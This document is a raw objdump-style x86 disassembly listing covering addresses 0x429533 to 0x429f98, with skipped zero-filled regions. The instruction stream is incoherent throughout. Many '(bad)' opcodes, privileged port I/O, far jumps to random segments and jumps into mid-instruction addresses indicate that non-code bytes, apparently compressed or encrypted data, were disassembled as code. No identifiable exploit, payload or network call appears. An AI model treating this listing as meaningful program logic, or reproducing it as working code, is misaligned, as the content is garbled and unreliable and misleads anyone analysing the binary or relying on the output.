  429533:	retf   0x9acb
  429536:	cli    
  429537:	out    dx,eax
  429538:	loope  0x4294e1
  42953a:	clc    
  42953b:	push   ecx
  42953c:	mov    eax,ds:0xa0a37343
  429541:	cwde   
  429542:	cmp    al,0xd8
  429544:	scas   eax,DWORD PTR es:[edi]
  429545:	cmp    DWORD PTR [eax],esp
  429547:	stc    
  429548:	sbb    ebx,0x52
  42954b:	das    
  42954c:	pop    esp
  42954d:	and    eax,0x8e4e266b
  429552:	sbb    al,0xaf
  429554:	sub    esi,edi
  429556:	lea    ebx,[edi+0x39d054db]
  42955c:	sub    BYTE PTR [edi+ecx*1-0x50ff3ba],bl
  429563:	jmp    0x503e9edc
  429568:	dec    ebp
  429569:	cs jmp 0xad04ec0e
  42956f:	or     BYTE PTR [edi-0x6d],ah
  429572:	and    al,dh
  429574:	bsf    esi,esp
  429577:	dec    esp
  429578:	sar    DWORD PTR [ecx-0x29],0xd8
  42957c:	in     al,0x91
  42957e:	mul    BYTE PTR [edi+esi*2-0x62]
  429582:	and    al,0xf6
  429584:	scas   eax,DWORD PTR es:[edi]
  429585:	or     ebx,DWORD PTR [eax-0x33e9eaa6]
  42958b:	test   BYTE PTR [edx-0x6d1a1081],dl
  429591:	popa   
  429592:	or     eax,0xdbff7e1b
  429597:	loope  0x429615
  429599:	loop   0x429619
  42959b:	repnz dec BYTE PTR [ebp+0x7d9bcd81]
  4295a2:	(bad)  
  4295a3:	leave  
  4295a4:	mov    ebp,0x4233552a
  4295a9:	int    0xb2
  4295ab:	inc    eax
  4295ac:	(bad)  
  4295ad:	enter  0xa3a9,0xe4
  4295b1:	inc    edx
  4295b2:	jae    0x4295fb
  4295b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295b5:	or     esp,DWORD PTR [eax-0x6b919ec5]
  4295bb:	test   al,0xdb
  4295bd:	leave  
  4295be:	jo     0x42958d
  4295c0:	je     0x4295e4
  4295c2:	shl    DWORD PTR [eax+edi*8+0x3b],0x7e
  4295c7:	mov    ds:0xf9e49e3b,eax
  4295cc:	mov    ebx,0x5cfdb5b3
  4295d1:	(bad)  
  4295d2:	mov    ch,BYTE PTR [edi-0x7694225e]
  4295d8:	test   al,0xe6
  4295da:	push   ds
  4295db:	dec    esp
  4295dc:	int3   
  4295dd:	mov    cl,0x5d
  4295df:	push   0x35f2b03a
  4295e4:	adc    BYTE PTR [esi+eax*2+0x71],ch
  4295e8:	add    al,0x94
  4295ea:	jae    0x429653
  4295ec:	cmp    al,0xb1
  4295ee:	fnstenv [eax]
  4295f0:	push   ss
  4295f1:	pop    ds
  4295f2:	jle    0x429655
  4295f4:	mov    ch,0x81
  4295f6:	das    
  4295f7:	sub    BYTE PTR [edi-0x1540e977],ah
  4295fd:	fsub   st(6),st
  4295ff:	dec    edi
  429600:	iretw  
  429602:	stos   BYTE PTR es:[edi],al
  429603:	fidivr WORD PTR [esi+esi*1+0x33d48e4d]
  42960a:	rcr    DWORD PTR [edx+edx*4-0x2e],0x50
  42960f:	in     eax,0x0
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	xor    dl,BYTE PTR [edx]
  429682:	loopne 0x429621
  429684:	jo     0x429640
  429686:	add    DWORD PTR [eax],eax
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	cmp    eax,0x51321ed5
  429691:	jne    0x4296f0
  429693:	arpl   WORD PTR [ebx+ebp*8-0x12128512],sp
  42969a:	daa    
  42969b:	shl    DWORD PTR [eax-0x10546fb0],cl
  4296a1:	xchg   ebp,eax
  4296a2:	adc    BYTE PTR [eax-0x3d30f7a1],cl
  4296a8:	mov    ds:0xc9842cf8,al
  4296ad:	fnstenv [eax+0x6a]
  4296b0:	xchg   edx,eax
  4296b1:	loop   0x4296f2
  4296b3:	inc    ecx
  4296b4:	data16 aaa 
  4296b6:	test   BYTE PTR [esi+0x4afabfaf],cl
  4296bc:	push   ss
  4296bd:	mov    eax,ds:0xf752be10
  4296c2:	stos   DWORD PTR es:[edi],eax
  4296c3:	mov    eax,DWORD PTR [edx+0x36e5b8c3]
  4296c9:	push   ebp
  4296ca:	mov    al,0xe6
  4296cc:	sub    al,0x71
  4296ce:	mov    ds:0x96ef430c,eax
  4296d3:	pop    ecx
  4296d4:	jge    0x4296c4
  4296d6:	bndstx [esi-0xd],(bad)
  4296da:	in     al,dx
  4296db:	pushf  
  4296dc:	stc    
  4296dd:	adc    dl,BYTE PTR [edx-0x90c1bbc]
  4296e3:	sbb    al,0x1
  4296e5:	dec    ecx
  4296e6:	in     al,0x74
  4296e8:	sbb    BYTE PTR [edx],ah
  4296ea:	mov    fs,WORD PTR [edx]
  4296ec:	add    al,0xf3
  4296ee:	push   edx
  4296ef:	pop    ebp
  4296f0:	cmp    DWORD PTR [eax+esi*8],ecx
  4296f3:	hlt    
  4296f4:	jmp    0x45ee:0xfae3db2c
  4296fb:	xchg   ebp,eax
  4296fc:	adc    cl,BYTE PTR [edi+0x54]
  4296ff:	mov    ah,0x26
  429701:	jnp    0x4296a8
  429703:	push   esi
  429704:	cmc    
  429705:	xchg   ebp,eax
  429706:	pop    esi
  429707:	sahf   
  429708:	nop
  429709:	in     eax,dx
  42970a:	xor    edx,edx
  42970c:	push   0x3e8f4b6f
  429711:	jmp    0x42973b
  429713:	dec    ebp
  429714:	dec    esp
  429715:	test   eax,0x1f743a85
  42971a:	call   0x6012a52
  42971f:	(bad)  
  429720:	pop    edx
  429721:	push   ss
  429722:	or     eax,0x32396f89
  429727:	popf   
  429728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429729:	mov    ch,0x61
  42972b:	pushf  
  42972c:	clc    
  42972d:	stc    
  42972e:	mov    ebx,0xd5b1037a
  429733:	das    
  429734:	pushf  
  429735:	xchg   ebp,eax
  429736:	add    eax,0xa503a394
  42973b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42973c:	sbb    al,ch
  42973e:	pop    esp
  42973f:	rol    BYTE PTR [edi],0x5e
  429742:	pop    esp
  429743:	(bad)  
  429744:	ror    DWORD PTR [eax-0x50cf3405],0x1
  42974b:	not    DWORD PTR [ebp+esi*4+0xb9bf53f]
  429752:	mov    ds:0xa735b458,al
  429757:	ret    
  429758:	leave  
  429759:	jo     0x4297a2
  42975b:	dec    esp
  42975c:	arpl   WORD PTR [eax+0x65dfbeea],sp
  429762:	push   ds
  429763:	daa    
  429764:	adc    al,0xab
  429766:	dec    edi
  429767:	push   0xffffff8e
  429769:	sti    
  42976a:	hlt    
  42976b:	scas   al,BYTE PTR es:[edi]
  42976c:	rcr    DWORD PTR [edx+0x4af7fd2d],cl
  429772:	or     eax,0xe8eb0bbb
  429777:	add    ecx,DWORD PTR [edx-0x1b]
  42977a:	jg     0x429791
  42977c:	xchg   ebx,eax
  42977d:	mov    WORD PTR ds:0x8923bbb,fs
  429783:	cmp    bh,BYTE PTR [eax-0x4f]
  429786:	mov    dh,0x76
  429788:	sti    
  429789:	inc    edx
  42978a:	dec    ecx
  42978b:	stos   BYTE PTR es:[edi],al
  42978c:	call   0x0:0x478e02
	...
  4297f3:	add    BYTE PTR [eax],dh
  4297f5:	inc    edx
  4297f6:	fbld   TBYTE PTR [edx-0x1]
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	lds    esp,FWORD PTR [ecx-0x448bfc0e]
  429806:	add    DWORD PTR [eax],eax
  429808:	add    al,0x1
  42980a:	add    BYTE PTR [eax],al
  42980c:	push   ebp
  42980d:	push   eax
  42980e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42980f:	sbb    bl,BYTE PTR [esi-0x6e388887]
  429815:	mov    cl,0x6c
  429817:	jb     0x429847
  429819:	cmp    eax,0xc5c2cf2d
  42981e:	xchg   edx,eax
  42981f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429820:	mov    edi,0x493f837d
  429825:	cmp    esi,ebx
  429827:	pop    esi
  429828:	push   ss
  429829:	rcr    DWORD PTR [ecx],1
  42982b:	xchg   edi,eax
  42982c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42982d:	ficom  WORD PTR [ebp-0x59300113]
  429833:	daa    
  429834:	xor    BYTE PTR [esi-0x489b3c7b],0x8
  42983b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42983c:	loopne 0x42989d
  42983e:	push   esp
  42983f:	push   ss
  429840:	push   0xffffffd4
  429842:	gs call 0x9021a918
  429848:	dec    bl
  42984a:	add    DWORD PTR [edx+eax*8-0x45],ecx
  42984e:	mov    edx,ebp
  429850:	push   0x794a2e84
  429855:	adc    BYTE PTR [eax],dl
  429857:	sub    al,0xe4
  429859:	ret    
  42985a:	int3   
  42985b:	mov    ecx,0xa41902c3
  429860:	pop    esi
  429861:	xor    DWORD PTR [ebx],esp
  429863:	xchg   edx,eax
  429864:	adc    eax,0x2eadbfe8
  429869:	add    al,0x7a
  42986b:	(bad)  
  42986c:	neg    BYTE PTR [ecx-0x33f2ea0b]
  429872:	neg    DWORD PTR [edi-0x38]
  429875:	(bad)  
  429877:	lods   eax,DWORD PTR ds:[esi]
  429878:	cmp    bl,dh
  42987a:	push   ds
  42987b:	mov    al,ds:0x9a89ef4e
  429880:	pop    eax
  429881:	sbb    eax,0x54bb6e82
  429886:	scas   eax,DWORD PTR es:[edi]
  429887:	sub    ebp,0x29
  42988a:	jne    0x42988b
  42988c:	mov    ecx,0x55e92bfb
  429891:	scas   al,BYTE PTR es:[edi]
  429892:	add    esp,esp
  429894:	rcr    BYTE PTR [edx],0x6e
  429897:	adc    ah,BYTE PTR [esi]
  429899:	mov    dh,0x1c
  42989b:	fdiv   DWORD PTR es:[edx+eiz*4+0x7523e53f]
  4298a3:	dec    edx
  4298a4:	cmp    eax,0x3ba5072
  4298a9:	cdq    
  4298aa:	(bad)  [edx+0xd]
  4298ad:	sub    ch,BYTE PTR [edx-0x191f6034]
  4298b3:	shl    DWORD PTR [ecx-0x13d0268e],1
  4298b9:	cmc    
  4298ba:	(bad)  
  4298bb:	icebp  
  4298bc:	shr    DWORD PTR [esi+0x33bdf33b],cl
  4298c2:	adc    eax,0x6c6ef08b
  4298c7:	js     0x429896
  4298c9:	jge    0x4298ab
  4298cb:	lods   eax,DWORD PTR ds:[esi]
  4298cc:	xchg   esp,eax
  4298cd:	jg     0x429938
  4298cf:	add    edi,DWORD PTR [esi]
  4298d1:	aam    0x1
  4298d3:	out    0x8,eax
  4298d5:	(bad)  
  4298d6:	(bad)  
  4298d7:	jge    0x4298a0
  4298d9:	stc    
  4298da:	repz sub eax,0xe1e8df94
  4298e0:	or     bl,BYTE PTR [eax+0x9]
  4298e3:	test   edx,edx
  4298e5:	adc    DWORD PTR [edx-0x3b8615ec],ebp
  4298eb:	retf   0xaae2
  4298ee:	or     ch,BYTE PTR [edi+edi*1-0x4a]
  4298f2:	bound  ebx,QWORD PTR [ecx-0x2]
  4298f5:	push   cs
  4298f6:	cmp    ch,BYTE PTR [esi+0x6f2f2ed7]
  4298fc:	jne    0x4298a6
  4298fe:	xchg   edi,eax
  4298ff:	ins    DWORD PTR es:[edi],dx
  429900:	test   WORD PTR [eax-0x67f88dc6],di
  429907:	out    0xc2,eax
  429909:	shl    BYTE PTR [edi+ecx*1],1
  42990c:	mov    al,0x1e
  42990e:	add    esp,0x0
	...
  429974:	push   edi
  429975:	push   0xdf7fdf64
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	loope  0x429991
  429982:	push   cs
  429983:	pop    ebp
  429984:	js     0x429942
  429986:	add    DWORD PTR [eax],eax
  429988:	add    al,0x1
  42998a:	add    BYTE PTR [eax],al
  42998c:	jl     0x4299bb
  42998e:	mov    al,0xea
  429990:	mov    eax,0x959fc640
  429995:	xchg   BYTE PTR [ecx+0x92822b9],bl
  42999b:	dec    esp
  42999c:	out    0xd8,eax
  42999e:	jne    0x4299fc
  4299a0:	push   0xb49fd555
  4299a5:	xor    ebx,DWORD PTR [edi]
  4299a7:	or     eax,0x46de1ee
  4299ac:	mov    eax,ds:0x484bb924
  4299b1:	and    DWORD PTR [edi+0x6395dce0],0x750cd0bd
  4299bb:	arpl   bp,di
  4299bd:	(bad)  
  4299be:	popa   
  4299bf:	test   DWORD PTR [edi],0x6c93a79c
  4299c5:	test   BYTE PTR [esp+ecx*2-0x66],bl
  4299c9:	addr16 pop ss
  4299cb:	xchg   edi,eax
  4299cc:	dec    ecx
  4299cd:	bound  ecx,QWORD PTR [esi]
  4299cf:	sbb    edx,DWORD PTR [edi]
  4299d1:	pushf  
  4299d2:	xor    dh,BYTE PTR [ecx]
  4299d4:	sbb    BYTE PTR [eax-0x595bbdff],cl
  4299da:	jne    0x429a49
  4299dc:	mov    WORD PTR [esi+0x5e],es
  4299df:	shl    BYTE PTR [ecx-0x5e],1
  4299e2:	add    edi,ebx
  4299e4:	out    dx,al
  4299e5:	mov    WORD PTR [esi],ss
  4299e7:	test   al,0x64
  4299e9:	loopne 0x429984
  4299eb:	pushf  
  4299ec:	sti    
  4299ed:	ins    BYTE PTR es:[edi],dx
  4299ee:	test   BYTE PTR [eax],bl
  4299f0:	jae    0x4299d1
  4299f2:	loopne 0x429a09
  4299f4:	adc    DWORD PTR [esi],0xc10a537f
  4299fa:	cmp    al,0x8c
  4299fc:	ds xchg edi,eax
  4299fe:	and    eax,0x49029eca
  429a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a04:	adc    esp,eax
  429a06:	out    dx,al
  429a07:	push   esp
  429a08:	fwait
  429a09:	pop    ds
  429a0a:	xchg   ecx,eax
  429a0b:	ss jnp 0x429a70
  429a0e:	mov    bh,BYTE PTR [edi+0x4f]
  429a11:	dec    esp
  429a12:	sbb    eax,0x73a749b2
  429a17:	mov    edx,0x6bac7e6a
  429a1c:	hlt    
  429a1d:	aaa    
  429a1e:	sbb    ebp,DWORD PTR [ebx+0x63]
  429a21:	xor    al,ah
  429a23:	sub    ch,BYTE PTR [eax+edi*1-0x68]
  429a27:	mov    esi,DWORD PTR [ecx-0x7e76cea5]
  429a2d:	xor    BYTE PTR [ebp-0x6ddb5eb3],ah
  429a33:	pop    ebp
  429a34:	add    ebx,DWORD PTR [edi]
  429a36:	imul   edi,DWORD PTR [edi-0x21],0xab4715a4
  429a3d:	int    0xfe
  429a3f:	dec    esi
  429a40:	cmp    al,0x19
  429a42:	jmp    FWORD PTR [edi-0x3cc37b7e]
  429a48:	mov    esp,0x7f8165a9
  429a4d:	pop    ss
  429a4e:	sbb    dl,cl
  429a50:	rol    BYTE PTR [eax],0xe
  429a53:	add    DWORD PTR [eax],edi
  429a55:	cwde   
  429a56:	mov    eax,0x15e84bce
  429a5b:	imul   edx,eax,0x1c
  429a5e:	add    ebx,edx
  429a60:	xchg   BYTE PTR [ecx-0xf0ca29e],dh
  429a66:	xchg   edx,eax
  429a67:	repz mov edi,0x7808b3c7
  429a6d:	pop    es
  429a6e:	sub    eax,DWORD PTR [edx]
  429a70:	push   edx
  429a71:	lahf   
  429a72:	leave  
  429a73:	sahf   
  429a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a75:	ss inc esp
  429a77:	mov    edi,0x6f6f7207
  429a7c:	clc    
  429a7d:	cmp    eax,0x821dfec8
  429a82:	xor    DWORD PTR [ebp-0x1d9fbc8f],esp
  429a88:	jne    0x429aeb
  429a8a:	add    dh,BYTE PTR ds:0x3e3065a4
	...
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x58a95667
  429b01:	popf   
  429b02:	imul   esi,esi,0x7c
  429b05:	mov    ebp,0x1040001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	inc    eax
  429b0d:	not    DWORD PTR [edi-0x7e6f20c8]
  429b13:	ret    0xa1a6
  429b16:	pop    ebx
  429b17:	sub    ch,BYTE PTR [edx+edx*1]
  429b1a:	sbb    esi,DWORD PTR [esi+0x78]
  429b1d:	out    0x61,eax
  429b1f:	and    ebx,edi
  429b21:	mov    ds:0x5749edc9,al
  429b26:	es pop es
  429b28:	xlat   BYTE PTR ds:[ebx]
  429b29:	jg     0x429b81
  429b2b:	jp     0x429b95
  429b2d:	jae    0x429ab4
  429b2f:	test   eax,0x23906340
  429b34:	setbe  BYTE PTR [esi+0x2d]
  429b38:	adc    DWORD PTR [esi-0xab7ddd6],esi
  429b3e:	jg     0x429b9a
  429b40:	(bad)  
  429b41:	scas   eax,DWORD PTR es:[edi]
  429b42:	in     eax,0x55
  429b44:	data16 jl 0x429bc2
  429b47:	xor    ch,BYTE PTR [ecx+0x28]
  429b4a:	and    DWORD PTR [ebx+0x5d772fae],ebp
  429b50:	adc    eax,0xe0acf4e0
  429b55:	pop    edi
  429b56:	jo     0x429b38
  429b58:	cmp    al,0x5
  429b5a:	push   eax
  429b5b:	popf   
  429b5c:	inc    edx
  429b5d:	retf   0x4e53
  429b60:	stos   BYTE PTR es:[edi],al
  429b61:	mov    ebp,0xf6dc4401
  429b66:	out    0xf7,al
  429b68:	ret    
  429b69:	je     0x429b42
  429b6b:	cld    
  429b6c:	repnz icebp 
  429b6e:	pop    esi
  429b6f:	or     eax,0x3cbd4f5e
  429b74:	mov    ds:0xf5b33de2,eax
  429b79:	jmp    0x90ee:0x1e6a5d02
  429b80:	aas    
  429b81:	sub    edx,0x3c28d363
  429b87:	mov    edi,0xe7c01728
  429b8c:	iret   
  429b8d:	push   eax
  429b8e:	sbb    BYTE PTR [esi],0x2e
  429b91:	xchg   ecx,eax
  429b92:	push   ecx
  429b93:	pop    es
  429b94:	(bad)  
  429b95:	cs leave 
  429b97:	mov    edi,0xd0083700
  429b9c:	shl    BYTE PTR [ebx+0x5d],0x54
  429ba0:	adc    DWORD PTR [edi+0x68515a6e],edx
  429ba6:	stos   BYTE PTR es:[edi],al
  429ba7:	retf   
  429ba8:	mov    ch,0x96
  429baa:	xchg   ecx,eax
  429bab:	mov    ch,BYTE PTR [eax-0x2]
  429bae:	adc    bp,WORD PTR [ecx-0x6ecaf709]
  429bb5:	rol    dh,0x82
  429bb8:	mov    eax,ds:0x6b5eff33
  429bbd:	mov    al,BYTE PTR [ecx-0x49]
  429bc0:	jo     0x429b94
  429bc2:	pop    ds
  429bc3:	scas   eax,DWORD PTR es:[edi]
  429bc4:	and    DWORD PTR [ebp+0x4b],ecx
  429bc7:	pop    esp
  429bc8:	stos   BYTE PTR es:[edi],al
  429bc9:	add    edx,DWORD PTR [esi]
  429bcb:	scas   al,BYTE PTR es:[edi]
  429bcc:	adc    dl,BYTE PTR [eax-0x6501ceb4]
  429bd2:	sub    BYTE PTR [ebx+eiz*1-0x1d10850],cl
  429bd9:	mov    eax,ds:0xc39db3b5
  429bde:	jnp    0x429b63
  429be0:	dec    esp
  429be1:	xchg   edi,eax
  429be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429be3:	stos   DWORD PTR es:[edi],eax
  429be4:	sub    eax,0xa2367446
  429be9:	cmp    eax,0x30bdc74b
  429bee:	(bad)  
  429bef:	xchg   ebx,eax
  429bf0:	sub    al,0x4d
  429bf2:	pushf  
  429bf3:	jp     0x429b96
  429bf5:	data16 stc 
  429bf7:	sub    eax,0xb110e00c
  429bfc:	dec    ebx
  429bfd:	pop    edi
  429bfe:	pop    ds
  429bff:	cdq    
  429c00:	out    0xdb,eax
  429c02:	and    dh,dl
  429c04:	loop   0x429be8
  429c06:	pusha  
  429c07:	add    BYTE PTR [ecx+edx*2-0x37],cl
  429c0b:	int3   
  429c0c:	hlt    
  429c0d:	mov    edx,DWORD PTR [esi+edi*4+0x0]
	...
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    bh,dh
  429c81:	jecxz  0x429c0f
  429c83:	jmp    0x104:0x1be80
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	les    ebx,FWORD PTR [ebp-0x51]
  429c8f:	sti    
  429c90:	mov    ds:0xdf748b1f,eax
  429c95:	ret    
  429c96:	and    eax,0xd24c31e1
  429c9b:	rcl    DWORD PTR [eax+0x6289679f],cl
  429ca1:	xor    ah,BYTE PTR [ebp-0x17]
  429ca4:	mov    edi,0xc597360b
  429ca9:	fdiv   st,st(2)
  429cab:	push   cs
  429cac:	cmc    
  429cad:	ins    DWORD PTR es:[edi],dx
  429cae:	fwait
  429caf:	mov    ebp,0xfcdbff55
  429cb4:	sbb    edx,DWORD PTR [edx]
  429cb6:	pushf  
  429cb7:	or     al,0x12
  429cb9:	call   0xc85b1420
  429cbe:	xchg   esp,eax
  429cbf:	xchg   ebx,eax
  429cc0:	sbb    al,0xf7
  429cc2:	pusha  
  429cc3:	push   esp
  429cc4:	int    0x18
  429cc6:	sti    
  429cc7:	mov    cl,BYTE PTR [ebp-0x31]
  429cca:	xor    DWORD PTR [edx],edx
  429ccc:	outs   dx,BYTE PTR ds:[esi]
  429ccd:	mov    esp,0x24499a52
  429cd2:	pop    ds
  429cd3:	jg     0x429cfc
  429cd5:	push   ecx
  429cd6:	add    DWORD PTR [eax],ebp
  429cd8:	dec    ebx
  429cd9:	popa   
  429cda:	pop    ebx
  429cdb:	or     dh,BYTE PTR [ebp-0x7c]
  429cde:	mov    al,ds:0xfdf3ab01
  429ce3:	xchg   edx,eax
  429ce4:	jnp    0x429d43
  429ce6:	dec    eax
  429ce7:	pop    esp
  429ce8:	ret    0x282e
  429ceb:	add    BYTE PTR [edi],ch
  429ced:	fcomp  st(3)
  429cef:	xchg   esp,eax
  429cf0:	mov    esp,0xcb1ff44a
  429cf5:	(bad)  
  429cf6:	fidiv  WORD PTR [edi+0x5a46363b]
  429cfc:	shr    BYTE PTR [esi-0xb],1
  429cff:	pop    es
  429d00:	mov    ds:0xb847799,al
  429d05:	xor    eax,0x3b728279
  429d0a:	push   esp
  429d0b:	and    eax,0x723ab33d
  429d10:	or     al,0xc0
  429d12:	cmp    eax,DWORD PTR [eax-0x7d754aa7]
  429d18:	push   eax
  429d19:	mov    ch,0xcf
  429d1b:	repnz stos BYTE PTR es:[edi],al
  429d1d:	rcr    DWORD PTR [edx],1
  429d1f:	test   al,0xcf
  429d21:	mov    DWORD PTR [ebx*2-0x6196f224],ebx
  429d28:	sbb    DWORD PTR [eax+0x40d97bb1],0x6e
  429d2f:	add    dh,BYTE PTR [eax-0x64]
  429d32:	inc    edi
  429d33:	and    al,0x88
  429d35:	lahf   
  429d36:	sbb    DWORD PTR [eax-0x11],eax
  429d39:	lahf   
  429d3a:	xchg   ecx,eax
  429d3b:	sub    eax,0xbeef9921
  429d40:	aaa    
  429d41:	jge    0x429cd2
  429d43:	(bad)  
  429d44:	(bad)  
  429d45:	adc    eax,0x5b9b3419
  429d4a:	sub    DWORD PTR [eax-0x2b],esp
  429d4d:	jmp    0xce15aafd
  429d52:	iret   
  429d53:	lods   al,BYTE PTR ds:[esi]
  429d54:	shl    BYTE PTR [esi+0x1cd79dfd],cl
  429d5a:	outs   dx,BYTE PTR ds:[esi]
  429d5b:	mov    al,0x84
  429d5d:	leave  
  429d5e:	stos   BYTE PTR es:[edi],al
  429d5f:	in     eax,dx
  429d60:	loope  0x429dbe
  429d62:	gs and eax,0xecb7e8f
  429d68:	mov    al,al
  429d6a:	sti    
  429d6b:	cmp    al,0x97
  429d6d:	lods   eax,DWORD PTR ds:[esi]
  429d6e:	mov    bl,cl
  429d70:	addr16 mov dh,0x19
  429d73:	sub    DWORD PTR [edi-0x3131e0ac],edx
  429d79:	jb     0x429d4c
  429d7b:	fs cmc 
  429d7d:	ja     0x429da3
  429d7f:	and    DWORD PTR [ecx+ebp*4-0x6c],edx
  429d83:	int3   
  429d84:	push   ds
  429d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d86:	(bad)  
  429d87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d88:	retf   
  429d89:	cmp    bl,BYTE PTR [edi]
  429d8b:	cdq    
  429d8c:	push   ebp
  429d8d:	dec    esp
  429d8e:	xchg   ecx,eax
  429d8f:	pop    esp
	...
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	sub    eax,0x849da21f
  429e05:	mov    edi,0x1040001
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	scas   eax,DWORD PTR es:[edi]
  429e0d:	mov    esp,0xca0e1fdf
  429e12:	jmp    0x70ce:0x67bf8951
  429e19:	and    ebp,DWORD PTR [esi-0x62]
  429e1c:	dec    edi
  429e1d:	adc    al,0x9c
  429e1f:	or     dh,BYTE PTR [edi+ebx*4]
  429e22:	lock adc ebp,ecx
  429e25:	jnp    0x429e15
  429e27:	ins    BYTE PTR es:[edi],dx
  429e28:	outs   dx,DWORD PTR ds:[esi]
  429e29:	cs push es
  429e2b:	ret    
  429e2c:	sti    
  429e2d:	jmp    0xd09d45bb
  429e32:	sbb    ch,dh
  429e34:	fwait
  429e35:	pop    ebp
  429e36:	loop   0x429e58
  429e38:	cwde   
  429e39:	mov    eax,ds:0xa0cf56e9
  429e3e:	xchg   ebp,eax
  429e3f:	jbe    0x429e63
  429e41:	ins    BYTE PTR es:[edi],dx
  429e42:	pusha  
  429e43:	fsubp  st(2),st
  429e45:	add    ah,BYTE PTR [edi+ecx*4+0x57]
  429e49:	and    dl,BYTE PTR [ebp-0x7ed0f6ba]
  429e4f:	addr16 dec edx
  429e51:	push   ecx
  429e52:	inc    ecx
  429e53:	retf   
  429e54:	daa    
  429e55:	ds pop edx
  429e57:	pop    esp
  429e58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e59:	cmp    BYTE PTR [ecx+0x466b3fdb],ah
  429e5f:	vpperm ymm1,ymm2,YMMWORD PTR [esi],ymm0
  429e65:	inc    esi
  429e66:	js     0x429e86
  429e68:	inc    edi
  429e69:	mov    DWORD PTR [eax+eiz*4],edx
  429e6c:	add    al,0xa8
  429e6e:	push   ebp
  429e6f:	pop    eax
  429e70:	push   esp
  429e71:	inc    ebx
  429e72:	lahf   
  429e73:	in     eax,dx
  429e74:	inc    ebp
  429e75:	sar    DWORD PTR [eax-0x2a],0xc7
  429e79:	sub    esp,DWORD PTR [esi-0x31fb98ed]
  429e7f:	loop   0x429eee
  429e81:	dec    edx
  429e82:	or     DWORD PTR [ebp-0x59],ebp
  429e85:	cdq    
  429e86:	mov    eax,0x375b44f5
  429e8b:	cmp    BYTE PTR [ebp+0x39949cee],0x4c
  429e92:	add    al,0x66
  429e94:	int    0xcc
  429e96:	les    ecx,FWORD PTR [edi]
  429e98:	dec    ecx
  429e99:	or     eax,DWORD PTR [edi]
  429e9b:	and    dl,dh
  429e9d:	lahf   
  429e9e:	retf   0xc9a5
  429ea1:	add    bh,bl
  429ea3:	out    dx,eax
  429ea4:	and    al,0x52
  429ea6:	adc    ebx,DWORD PTR [eax-0x7718bfdb]
  429eac:	loopne 0x429e99
  429eae:	lahf   
  429eaf:	or     dl,bh
  429eb1:	adc    al,BYTE PTR [ebx+0xef69a5e]
  429eb7:	push   cs
  429eb8:	push   eax
  429eb9:	dec    edi
  429eba:	dec    esp
  429ebb:	mov    ah,0xcf
  429ebd:	xor    al,0x3f
  429ebf:	and    eax,0x36f1c94c
  429ec4:	sbb    ch,BYTE PTR [esi+0x5]
  429ec7:	mov    edi,0x6709e76d
  429ecc:	scas   eax,DWORD PTR es:[edi]
  429ecd:	dec    ebp
  429ece:	xchg   ebp,eax
  429ecf:	inc    ecx
  429ed0:	sub    BYTE PTR [esp+eax*2+0x23345d1f],cl
  429ed7:	ja     0x429e81
  429ed9:	or     edi,edi
  429edb:	pop    ebx
  429edc:	ins    DWORD PTR es:[edi],dx
  429edd:	imul   ebp,edi,0x207322a6
  429ee3:	nop
  429ee4:	pusha  
  429ee5:	dec    ebp
  429ee6:	fsubr  QWORD PTR [eax+0x7d]
  429ee9:	xor    eax,0xf83dda54
  429eee:	cmc    
  429eef:	out    dx,eax
  429ef0:	sbb    ecx,DWORD PTR [edx+0x5d]
  429ef3:	(bad)  
  429ef4:	test   al,0xd1
  429ef6:	xchg   ecx,eax
  429ef7:	jecxz  0x429e9a
  429ef9:	aam    0x1
  429efb:	shl    DWORD PTR [esi+0x46],1
  429efe:	push   DWORD PTR [esi]
  429f00:	inc    eax
  429f01:	in     eax,dx
  429f02:	jae    0x429f5f
  429f04:	pop    esi
  429f05:	lods   al,BYTE PTR ds:[esi]
  429f06:	gs ds scas eax,DWORD PTR es:[edi]
  429f09:	mov    ah,0xae
  429f0b:	jle    0x429ed1
  429f0d:	mov    ?,WORD PTR [ecx+0x93]
	...
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x1cb0a816]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	jecxz  0x429f95
  429f8e:	dec    ebp
  429f8f:	adc    ebp,DWORD PTR [ecx-0x796e2a27]
  429f95:	popf   
  429f96:	pop    ss
  429f97:	stos   BYTE PTR es:[edi],al
  429f98:	pop    ss
